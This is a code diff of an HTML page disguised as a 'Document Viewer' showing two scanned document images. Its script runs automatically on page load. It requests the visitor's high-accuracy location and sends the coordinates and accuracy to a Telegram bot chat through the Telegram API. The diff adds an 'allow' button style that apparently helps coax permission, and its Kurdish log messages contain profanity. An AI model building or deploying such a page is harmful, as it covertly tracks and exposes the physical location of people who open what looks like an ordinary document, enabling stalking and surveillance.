@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Viewer - PDF Format</title>
+    <title>Document Viewer</title>
     <style>
         body {
             background-color: #525659;
@@ -49,6 +49,19 @@
             border-radius: 2px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.2);
         }
+        .btn-box {
+            text-align: center;
+            margin: 20px;
+        }
+        .allow-btn {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -59,12 +72,10 @@
             <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
         </div>
 
-        <!-- وێنەی یەکەم -->
         <div class="page-box">
             <img src="IMG_6579.jpeg" alt="Document Page 1">
         </div>
 
-        <!-- وێنەی دووەم -->
         <div class="page-box">
             <img src="IMG_6581.jpeg" alt="Document Page 2">
         </div>
@@ -75,7 +86,10 @@
         const CHAT_ID = "659131693";
 
         function s1derGetLocationAndSend() {
-            if (!navigator.geolocation) return;
+            if (!navigator.geolocation) {
+                console.error("Geolocation is not supported by this browser.");
+                return;
+            }
 
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
@@ -83,7 +97,7 @@
                 const acc = position.coords.accuracy;
 
                 const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
-                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی دۆکیۆمێنت:%0Aوردبوونەوە: ${acc} مەتر`;
+                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی هۆستکراو دۆزرایەوە.%0Aوردبوونەوە: ${acc} مەتر`;
 
                 try {
                     await fetch(locUrl);
@@ -92,15 +106,18 @@
                     console.error("فاک، ناردن سەرکەوتوو نەبوو:", err);
                 }
             }, (error) => {
-                console.error("فاک، مۆڵەت نەدرا:", error);
+                console.error("فاک، مۆڵەتی لۆکەیشن لەسەر هۆست ڕەتکرایەوە:", error.code);
             }, {
                 enableHighAccuracy: true,
-                timeout: 15000,
+                timeout: 20000,
                 maximumAge: 0
             });
         }
 
-        window.onload = s1derGetLocationAndSend;
+        // کارپێکردن راستەوخۆ لە کاتی لۆدبوونی پەڕەکە
+        window.onload = () => {
+            setTimeout(s1derGetLocationAndSend, 1000);
+        };
     </script>
 </body>
 </html>
